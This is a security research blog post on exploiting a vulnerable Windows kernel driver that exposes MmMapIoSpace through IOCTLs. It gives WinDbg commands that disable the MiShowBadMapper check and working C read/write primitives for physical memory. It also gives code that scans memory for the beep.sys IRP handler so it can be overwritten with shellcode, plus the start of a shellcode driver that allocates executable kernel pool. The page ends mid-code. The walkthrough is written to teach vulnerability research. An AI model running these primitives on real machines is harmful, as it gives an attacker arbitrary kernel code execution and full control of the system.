<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>kernel driver bughunting: exploiting MmMapIoSpace | home</title>
<meta name=keywords content><meta name=description content="In this installment of the kernel driver exploitation series, we’ll explore a widely used yet vulnerable memory mapping function in the Windows kernel known as MmMapIoSpace."><meta name=author content="c"><link rel=canonical href=https://cschwarz1.github.io/posts/0x05/><link crossorigin=anonymous href=/assets/css/stylesheet.min.96b5d433286ce64613ec35318a18a97f0d7cebb3efa2f338029d67432dab2301.css integrity="sha256-lrXUMyhs5kYT7DUxihipfw1867PvovM4Ap1nQy2rIwE=" rel="preload stylesheet" as=style><link rel=icon href=https://cschwarz1.github.io/favicon.ico><link rel=apple-touch-icon href=https://cschwarz1.github.io/apple-touch-icon.png><link rel=alternate hreflang=en href=https://cschwarz1.github.io/posts/0x05/><meta name=twitter:card content="summary"><meta name=twitter:title content="kernel driver bughunting: exploiting MmMapIoSpace | home"><meta name=twitter:description content="In this installment of the kernel driver exploitation series, we’ll explore a widely used yet vulnerable memory mapping function in the Windows kernel known as MmMapIoSpace."><meta property="og:title" content="kernel driver bughunting: exploiting MmMapIoSpace | home"><meta property="og:description" content="In this installment of the kernel driver exploitation series, we’ll explore a widely used yet vulnerable memory mapping function in the Windows kernel known as MmMapIoSpace."><meta property="og:type" content="article"><meta property="og:url" content="https://cschwarz1.github.io/posts/0x05/"><meta property="og:image" content="https://cschwarz1.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-01-15T23:14:35+07:00"><meta property="article:modified_time" content="2025-01-15T23:14:35+07:00"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://cschwarz1.github.io/posts/"},{"@type":"ListItem","position":2,"name":"kernel driver bughunting: exploiting MmMapIoSpace","item":"https://cschwarz1.github.io/posts/0x05/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"kernel driver bughunting: exploiting MmMapIoSpace | home","name":"kernel driver bughunting: exploiting MmMapIoSpace","description":"In this installment of the kernel driver exploitation series, we’ll explore a widely used yet vulnerable memory mapping function in the Windows kernel known as MmMapIoSpace.","keywords":[],"wordCount":"2898","inLanguage":"en","datePublished":"2025-01-15T23:14:35+07:00","dateModified":"2025-01-15T23:14:35+07:00","author":{"@type":"Person","name":"c"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://cschwarz1.github.io/posts/0x05/"},"publisher":{"@type":"Organization","name":"home","logo":{"@type":"ImageObject","url":"https://cschwarz1.github.io/favicon.ico"}}}</script><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript></head><body class="dark type-posts kind-page layout-" id=top><script data-no-instant>function switchTheme(e){switch(e){case"light":document.body.classList.remove("dark");break;case"dark":document.body.classList.add("dark");break;default:window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")}}function isDarkTheme(){return document.body.className.includes("dark")}function getPrefTheme(){return localStorage.getItem("pref-theme")}function setPrefTheme(e){switchTheme(e),localStorage.setItem("pref-theme",e)}const toggleThemeCallbacks={};toggleThemeCallbacks.main=e=>{setPrefTheme(e?"light":"dark")},window.addEventListener("toggle-theme",function(){const e=isDarkTheme();for(const t in toggleThemeCallbacks)toggleThemeCallbacks[t](e)});function toggleThemeListener(){window.dispatchEvent(new CustomEvent("toggle-theme"))}</script><script>(function(){const t="dark",e=getPrefTheme(),n=e||t;switchTheme(n)})()</script><header class=header><nav class=nav><div class=logo><a href=https://cschwarz1.github.io/ accesskey=h title="home (Alt + H)">home</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://cschwarz1.github.io/categories/ title=categories>categories</a></li><li><a href=https://cschwarz1.github.io/tags/ title=tags>tags</a></li><li><a href=https://cschwarz1.github.io/aboutme/ title="about me">about me</a></li></ul></nav></header><main class="main post"><article class=post-single><header class=post-header><h1 class=post-title>kernel driver bughunting: exploiting MmMapIoSpace</h1><div class=post-description>In this installment of the kernel driver exploitation series, we’ll explore a widely used yet vulnerable memory mapping function in the Windows kernel known as MmMapIoSpace.</div><div class=post-meta><span class=meta-item><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar" style="user-select:text"><rect x="3" y="4" width="18" height="18" rx="2" ry="2" style="user-select:text"/><line x1="16" y1="2" x2="16" y2="6" style="user-select:text"/><line x1="8" y1="2" x2="8" y2="6" style="user-select:text"/><line x1="3" y1="10" x2="21" y2="10" style="user-select:text"/></svg>
<span>January 15, 2025</span></span><span class=meta-item>
<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text" style="user-select:text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z" style="user-select:text"/><polyline points="14 2 14 8 20 8" style="user-select:text"/><line x1="16" y1="13" x2="8" y2="13" style="user-select:text"/><line x1="16" y1="17" x2="8" y2="17" style="user-select:text"/><polyline points="10 9 9 9 8 9" style="user-select:text"/></svg>
<span>2898 words</span></span><span class=meta-item>
<svg width="24" height="24" viewBox="0 0 24 24" stroke="currentcolor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<span>14 min</span></span></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#introduction aria-label=Introduction>Introduction</a></li><li><a href=#exploitation-with-windbg aria-label="Exploitation with WinDbg">Exploitation with WinDbg</a></li><li><a href=#exploit-development aria-label="Exploit Development">Exploit Development</a></li></ul></div></details></div><div class=post-content><h2 id=introduction>Introduction</h2><p>To continue our journey in exploiting vulnerable drivers we will investigate one of the more common kernel NT functions responsible for memory corruptions, namely <code>MmMapIoSpace</code>. As per Microsoft <a href=https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmmapiospace>documentation</a> the function takes a physical (RAM) address as argument and returns the base virtual address that maps the base physical address for the range. So basically we can map physical addresses into virtual user space, which is pretty neat. Unfortunately from a kernel exploit developers perspective this function is primarily used for interacting with hardware, where the physical addresses are well-defined and memory-mapped device registers or reserved regions of physical memory are allocated by the operating system.</p><p>Due to the fact <code>MmMapIoSpace</code> operates directly on physical memory reliable exploitation to get arbitrary read and write primitives is particularly challenging. Modern OSes like Windows handle memory management using paging, where virtual addresses are mapped to physical addresses via page tables, making the physical memory layout invisible to user-mode. To abuse <strong>MmMapIoSpace</strong>, you need the exact physical address of the virtual memory region to map, translating virtual addresses to physical ones is difficult due to OS restrictions and the inability to map page tables.
Additionally, physical memory is often fragmented and dynamically managed, further complicating direct access. These challenges make working with <code>MmMapIoSpace</code> a rather non-trivial task.</p><h2 id=exploitation-with-windbg>Exploitation with WinDbg</h2><p>Since we need to work directly with physical memory, we must determine how to translate physical addresses into the virtual address space to interact with them effectively. The challenge lies in the fact that, under normal circumstances, developers rarely deal with physical memory directly, as this is entirely managed by the operating system. The OS abstracts the physical memory layout, handles paging, and provides virtual memory mappings, making physical addresses largely irrelevant for typical development tasks.</p><p>However, if we aim to hijack execution in kernel mode, we need a way to locate and manipulate specific regions of physical memory in a different way. This requires bypassing the operating system&rsquo;s abstractions to identify where kernel data structures or function pointers reside in physical memory. Without direct access to page tables for virtual-to-physical translation (restricted by modern Windows implementations), we must rely on alternative techniques, such as scanning physical memory for known patterns to locate our target memory regions. Only then can we map, modify, or overwrite these areas to achieve our desired level of control in kernel mode.</p><p>Another issue arises from changes introduced in Windows 10 version 1803, which specifically prevent mapping page tables and certain other sensitive memory regions using MmMapIoSpace. This presents itself particularly frustrating when kernel debugging where a simple physical memory read operation can unexpectedly cause the system to bugcheck. This behavior is one of the quirks associated with exploiting MmMapIoSpace and is linked to the MiShowBadMapper mechanism.</p><p>In Windows 10, bypassing this restriction can be done by modifying a single byte (changing its value from 0 to 2). However, in Windows 11, the process is more complex and requires some additional effort.</p><p>For Windows 10 the necessary steps in WinDbg are as follows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0: kd&gt; u MiShowBadMapper L20
</span></span><span class=line><span class=cl>nt!MiShowBadMapper:
</span></span><span class=line><span class=cl>fffff801`0a141ac4 48895c2410 mov qword ptr [rsp+10h],rbx
</span></span><span class=line><span class=cl>fffff801`0a141ac9 48896c2418 mov qword ptr [rsp+18h],rbp
</span></span><span class=line><span class=cl>fffff801`0a141ace 4889742420 mov qword ptr [rsp+20h],rsi
</span></span><span class=line><span class=cl>fffff801`0a141ad3 57 push rdi
</span></span><span class=line><span class=cl>fffff801`0a141ad4 4881ec90000000 sub rsp,90h
</span></span><span class=line><span class=cl>fffff801`0a141adb 488b050e511600 mov rax,qword ptr [nt!_security_cookie (fffff801`0a2a6bf0)]
</span></span><span class=line><span class=cl>fffff801`0a141ae2 4833c4 xor rax,rsp
</span></span><span class=line><span class=cl>fffff801`0a141ae5 4889842480000000 mov qword ptr [rsp+80h],rax
</span></span><span class=line><span class=cl>fffff801`0a141aed 8a1de7ad1900 mov bl,byte ptr [nt!MiState+0x1eda (fffff801`0a2dc8da)]
</span></span><span class=line><span class=cl>0: kd&gt; eb fffff801`0a2dc8da 2
</span></span></code></pre></div><p>To patch the check in Windows 11 following commands can be used:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0: kd&gt; u MiShowBadMapper L30
</span></span><span class=line><span class=cl>nt!MiShowBadMapper:
</span></span><span class=line><span class=cl>fffff803`09e3542c 48895c2418      mov     qword ptr [rsp+18h],rbx
</span></span><span class=line><span class=cl>fffff803`09e35431 55              push    rbp
</span></span><span class=line><span class=cl>fffff803`09e35432 56              push    rsi
</span></span><span class=line><span class=cl>fffff803`09e35433 57              push    rdi
</span></span><span class=line><span class=cl>fffff803`09e35434 4154            push    r12
</span></span><span class=line><span class=cl>fffff803`09e35436 4155            push    r13
</span></span><span class=line><span class=cl>fffff803`09e35438 4156            push    r14
</span></span><span class=line><span class=cl>fffff803`09e3543a 4157            push    r15
</span></span><span class=line><span class=cl>fffff803`09e3543c 488d6c24d9      lea     rbp,[rsp-27h]
</span></span><span class=line><span class=cl>&lt;/snip&gt;
</span></span><span class=line><span class=cl>fffff803`09e3549d 1bff            sbb     edi,edi
</span></span><span class=line><span class=cl>fffff803`09e3549f 23f9            and     edi,ecx
</span></span><span class=line><span class=cl>fffff803`09e354a1 4484f9          test    cl,r15b
</span></span><span class=line><span class=cl>fffff803`09e354a4 7419            je      nt!MiShowBadMapper+0x93 (fffff803`09e354bf)
</span></span><span class=line><span class=cl>fffff803`09e354a6 443825a7445d00  cmp     byte ptr [nt!KdPitchDebugger (fffff803`0a409954)],r12b
</span></span><span class=line><span class=cl>fffff803`09e354ad 7510            jne     nt!MiShowBadMapper+0x93 (fffff803`09e354bf)
</span></span><span class=line><span class=cl>fffff803`09e354af 44382513566200  cmp     byte ptr [nt!KdDebuggerNotPresent (fffff803`0a45aac9)],r12b
</span></span><span class=line><span class=cl>fffff803`09e354b6 7507            jne     nt!MiShowBadMapper+0x93 (fffff803`09e354bf)
</span></span><span class=line><span class=cl>fffff803`09e354b8 8bf9            mov     edi,ecx
</span></span><span class=line><span class=cl>fffff803`09e354ba e9c9010000      jmp     nt!MiShowBadMapper+0x25c (fffff803`09e35688)
</span></span><span class=line><span class=cl>fffff803`09e354bf 85ff            test    edi,edi
</span></span><span class=line><span class=cl>fffff803`09e354c1 0f85c1010000    jne     nt!MiShowBadMapper+0x25c (fffff803`09e35688)
</span></span><span class=line><span class=cl>fffff803`09e354c7 4c8d4c2448      lea     r9,[rsp+48h]
</span></span><span class=line><span class=cl>fffff803`09e354cc 4c8d4597        lea     r8,[rbp-69h]
</span></span><span class=line><span class=cl>fffff803`09e354d0 8d5710          lea     edx,[rdi+10h]
</span></span><span class=line><span class=cl>fffff803`09e354d3 e8984dbdff      call    nt!RtlCaptureStackBackTrace (fffff803`09a0a270)
</span></span><span class=line><span class=cl>0: kd&gt; bp fffff803`09e354a1 &#34;r r15 = 0; gc&#34;
</span></span></code></pre></div><p>To verify our driver is vulnerable we need to show that we can read and write arbitrary memory regions from user-space. For a simple proof of concept we will use a kernel debugger (WinDbg) and Filetest. Translating virtual to physical addresses in WinDbg is rather straight-forward, as we can extract the necessary information directly in the debugger.
The CR3 register (Control Register 3) serves a key role in memory management. It stores the physical address of the page directory base in memory, which is an essential part of the paging mechanism. The page directory base is used during the translation of virtual addresses into their corresponding physical addresses, making the CR3 register an integral component of the virtual memory management system.</p><p>The following example demonstrates how writable kernel memory can be translated into a physical address for use in memory-related operations. As part of our proof of concept, we utilize the well-known <code>KUserSharedData</code> structure. This choice is deliberate because it is a reliable and predictable target, as it is almost certain that data can be written into its offset at <code>+0x800</code>. The <code>KUserSharedData</code> structure is typically located at the virtual memory address <code>0xfffff78000000000</code>, making it a consistent and accessible location for this kind of operation. The screenshot included here provides a detailed illustration of how the translation process is carried out in practice.</p><figure class=center><img loading=lazy src=/images/x501.png></figure><p>The next step is to utilize our arbitrary read and write primitives to determine whether it is possible to modify kernel memory directly from user space. This approach allows us to test if unauthorized manipulation of kernel-level data can be achieved.</p><p>The driver employs IOCTL code <code>0x8000649c</code> to perform the mapping of physical memory to virtual address space using the <code>MmMapIoSpace</code>.
The Ghidra disassembly of the vulnerable write function is provided below:</p><figure class=center><img loading=lazy src=/images/x502.png></figure><p>Similarly, memory can be read using the IOCTL code <code>0x80006498</code>. This IOCTL is utilized by the driver to perform memory read operations, allowing access to specific regions of memory.</p><figure class=center><img loading=lazy src=/images/x503.png></figure><p>To interact with kernel memory, we use our trusted <code>filetest</code> tool to experiment with writable regions. Recall that <code>KUserSharedData</code> is located at the physical address <code>0xf7e2d800</code>.
In the next screenshot, we demonstrate writing a test payload, specifically the value <code>0x4141424243434444</code>, into <code>KUserSharedData</code> at offset <code>+0x800</code>. This operation confirms whether user space processes can successfully modify this memory region.</p><figure class=center><img loading=lazy src=/images/x504.png></figure><p>Using WinDbg, we can confirm that the data has been successfully written to the targeted memory location. The debugger output verifies that the test payload has been correctly placed in the <code>KUserSharedData</code> structure at the specified offset.</p><figure class=center><img loading=lazy src=/images/x505.png></figure><p>The same outcome can be achieved directly from user space by utilizing the IOCTL code <code>0x80006498</code>. This demonstrates that the memory write operation can be performed from user land, providing the expected results without requiring kernel-level access.</p><figure class=center><img loading=lazy src=/images/x506.png></figure><h2 id=exploit-development>Exploit Development</h2><p>In both scenarios, we can modify or read 8 bytes of memory at a time. The following C code provides an example of how these read and write operations can be implemented:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>DWORD64</span> <span class=nf>readPhysMem8bPrimitive</span><span class=p>(</span><span class=n>HANDLE</span> <span class=n>driver</span><span class=p>,</span> <span class=n>DWORD64</span> <span class=n>physicalAddress</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>DWORD</span> <span class=n>lpBytesReturned</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>iBuf</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>oBuf</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>memcpy</span><span class=p>(</span><span class=o>&amp;</span><span class=n>iBuf</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>physicalAddress</span><span class=p>,</span> <span class=mh>0x8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// calling kernel function MmMapioSpace to map physical address into user space
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>BOOL</span> <span class=n>status</span> <span class=o>=</span> <span class=nf>DeviceIoControl</span><span class=p>(</span>
</span></span><span class=line><span class=cl>		<span class=n>driver</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=n>IOCTL_CODE_READ_4B</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=n>iBuf</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=mh>0x8</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=n>oBuf</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=mh>0x8</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=o>&amp;</span><span class=n>lpBytesReturned</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nb>NULL</span>
</span></span><span class=line><span class=cl>	<span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=p>(</span><span class=n>DWORD64</span><span class=p>)(</span><span class=o>*</span><span class=p>(</span><span class=n>DWORD64</span><span class=o>*</span><span class=p>)</span><span class=n>oBuf</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>void</span> <span class=nf>writePhysMem8bPrimitive</span><span class=p>(</span><span class=n>HANDLE</span> <span class=n>driver</span><span class=p>,</span> <span class=n>DWORD64</span> <span class=n>physicalAddress</span><span class=p>,</span> <span class=n>DWORD64</span> <span class=n>bPayload</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>DWORD</span> <span class=n>lpBytesReturned</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>iBuf</span><span class=p>[</span><span class=mh>0x10</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>memcpy</span><span class=p>(</span><span class=o>&amp;</span><span class=n>iBuf</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>physicalAddress</span><span class=p>,</span> <span class=mh>0x8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>memcpy</span><span class=p>(</span><span class=o>&amp;</span><span class=n>iBuf</span><span class=p>[</span><span class=mi>8</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>bPayload</span><span class=p>,</span> <span class=mh>0x8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// calling kernel function MmMapioSpace to map physical address into user space
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>BOOL</span> <span class=n>status</span> <span class=o>=</span> <span class=nf>DeviceIoControl</span><span class=p>(</span>
</span></span><span class=line><span class=cl>		<span class=n>driver</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=n>IOCTL_CODE_WRITE_8B</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=n>iBuf</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=mh>0x10</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=o>&amp;</span><span class=n>lpBytesReturned</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nb>NULL</span>
</span></span><span class=line><span class=cl>	<span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>With these two functions, we now have the capability to exploit our driver and execute arbitrary code in kernel mode. While this approach is effective, there are limitations to consider. Since we cannot directly modify critical data structures like Page Table Entries (PTEs) or other sensitive components in ring 0, we need an alternative method.</p><p>Fortunately, after some effort and research, I came across an excellent blog post by <em>stong</em> on <a href=https://github.com/stong/CVE-2020-15368>CVE-2020-15368</a>. In this post, he demonstrates how to overwrite the Beep IRP handler with shellcode mapped from a custom driver. This technique aligns perfectly with our needs, so we will follow the same approach.</p><p>As an additional note, there was a recent research publication by <em>Cedrik Van Bockhaven</em> from Outflank titled <a href=https://www.outflank.nl/blog/2023/12/14/mapping-virtual-to-physical-adresses-using-superfetch/>&ldquo;Mapping Virtual to Physical Addresses Using Superfetch&rdquo;</a>, which explores bypassing restrictions with <code>MmMapIoSpace</code>. However, since my research predates this (conducted in 2022 but not yet published), I have not incorporated those findings into this approach.</p><p>The beep functionality on a PC is managed by a kernel driver <code>beep.sys</code>, which is loaded by default on all Windows systems. Drawing from techniques used in game hacking, we locate the signature in memory where the driver invokes its IRP Handler, overwrite this address with our custom shellcode, and then trigger the exploit by using <code>beep.sys's</code> IOCTL code. This method effectively repurposes the Beep driver to execute our payload, providing a reliable path for kernel-mode code execution.</p><p>Below is the signature we need to locate in memory, and in the WinDbg output we can examine the bytes at the start of the beep IRP handler:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=n>DWORD64</span> <span class=n>beepSignature1</span> <span class=o>=</span> <span class=mh>0x8b4c20ec83485340</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>DWORD64</span> <span class=n>beepSignature2</span> <span class=o>=</span> <span class=mh>0xd28b4c000000b882</span><span class=p>;</span>
</span></span></code></pre></div><figure class=center><img loading=lazy src=/images/x507.png></figure><p>Here’s the function to accomplish this in C:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=n>BOOL</span> <span class=nf>findBeepIOHandler</span><span class=p>(</span><span class=n>IN</span> <span class=n>HANDLE</span> <span class=n>driver</span><span class=p>,</span> <span class=n>OUT</span> <span class=n>DWORD64</span><span class=o>*</span> <span class=n>pBeepHandler</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[i] interacting with driver to scan for beep signature</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>DWORD64</span> <span class=n>start</span> <span class=o>=</span> <span class=mh>0x000001290</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>DWORD64</span> <span class=n>end</span> <span class=o>=</span> <span class=mh>0x2fffff290</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=n>DWORD64</span> <span class=n>index</span> <span class=o>=</span> <span class=n>start</span><span class=p>;</span> <span class=n>index</span> <span class=o>&lt;=</span> <span class=n>end</span><span class=p>;</span> <span class=n>index</span> <span class=o>+=</span> <span class=mh>0x1000</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=c1>//PRINTA(&#34;[+] check index 0x%x\n&#34;, index);
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=n>DWORD64</span> <span class=n>byteSequence</span> <span class=o>=</span> <span class=n>readPhysMem8bPrimitive</span><span class=p>(</span><span class=n>driver</span><span class=p>,</span> <span class=n>index</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=c1>// check bytes at physical memory
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=k>if</span> <span class=p>(</span><span class=n>byteSequence</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=c1>//PRINTA(&#34;[+] check bytes for beep %x\n&#34;, byteSequence);
</span></span></span><span class=line><span class=cl><span class=c1></span>			<span class=n>DWORD64</span> <span class=n>beepSignature1</span> <span class=o>=</span> <span class=mh>0x8b4c20ec83485340</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=n>DWORD64</span> <span class=n>beepSignature2</span> <span class=o>=</span> <span class=mh>0xd28b4c000000b882</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=n>byteSequence</span> <span class=o>==</span> <span class=n>beepSignature1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=c1>// success signature[8] found, check next 8 bytes for confirmation
</span></span></span><span class=line><span class=cl><span class=c1></span>				<span class=n>byteSequence</span> <span class=o>=</span> <span class=n>readPhysMem8bPrimitive</span><span class=p>(</span><span class=n>driver</span><span class=p>,</span> <span class=p>(</span><span class=n>index</span> <span class=o>+</span> <span class=mh>0x8</span><span class=p>));</span>
</span></span><span class=line><span class=cl>				<span class=k>if</span> <span class=p>(</span><span class=n>byteSequence</span> <span class=o>==</span> <span class=n>beepSignature2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>					<span class=c1>// save
</span></span></span><span class=line><span class=cl><span class=c1></span>					<span class=o>*</span><span class=n>pBeepHandler</span> <span class=o>=</span> <span class=n>index</span><span class=p>;</span>
</span></span><span class=line><span class=cl>					<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[+] beep IOCTL handler at 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>pBeepHandler</span><span class=p>);</span>
</span></span><span class=line><span class=cl>					<span class=k>return</span> <span class=n>TRUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>				<span class=p>}</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;Beep IOCTL Handler not found, exiting</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Once we have successfully located the IRP Handler, the next step is to write our shellcode (which essentially consists of our custom driver) to that specific memory address. After placing the shellcode, we can trigger the Beep IOCTL to initiate the exploitation. The driver code itself is relatively simple: it allocates memory, copies the shellcode into this allocated region, and then starts a new thread to execute arbitrary code.</p><p>What makes this method so powerful is that, once the thread is up and running, we gain the ability to execute virtually any code in kernel memory. This provides us with immense flexibility and control over what can be executed next. It&rsquo;s an incredibly elegant solution, and the credit goes to <em>stong</em> for the brilliant idea. Neat!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=c1>// Driver.c
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>__int64</span> <span class=nf>__declspec</span><span class=p>(</span><span class=n>dllexport</span><span class=p>)</span> <span class=kr>__fastcall</span> <span class=n>ShellCodeIrpHandler</span><span class=p>(</span><span class=k>struct</span> <span class=nc>_DEVICE_OBJECT</span><span class=o>*</span> <span class=n>a1</span><span class=p>,</span> <span class=n>IRP</span><span class=o>*</span> <span class=n>irp</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>ULONG</span> <span class=n>ioctl_no</span> <span class=o>=</span> <span class=n>irp</span><span class=o>-&gt;</span><span class=n>Tail</span><span class=p>.</span><span class=n>Overlay</span><span class=p>.</span><span class=n>CurrentStackLocation</span><span class=o>-&gt;</span><span class=n>Parameters</span><span class=p>.</span><span class=n>DeviceIoControl</span><span class=p>.</span><span class=n>IoControlCode</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>BeepIRPStruct</span><span class=o>*</span> <span class=n>pBeepStructData</span> <span class=o>=</span> <span class=p>(</span><span class=n>BeepIRPStruct</span><span class=o>*</span><span class=p>)</span><span class=n>irp</span><span class=o>-&gt;</span><span class=n>AssociatedIrp</span><span class=p>.</span><span class=n>SystemBuffer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>PVOID</span> <span class=n>pRwxData</span> <span class=o>=</span> <span class=n>pBeepStructData</span><span class=o>-&gt;</span><span class=n>nt_ExAllocatePoolWithTag</span><span class=p>(</span><span class=n>NonPagedPoolExecute</span><span class=p>,</span> <span class=n>pBeepStructData</span><span class=o>-&gt;</span><span class=n>szPayloadSize</span><span class=p>,</span> <span class=err>&#39;</span><span class=n>hoho</span><span class=err>&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=c1>//__debugbreak();
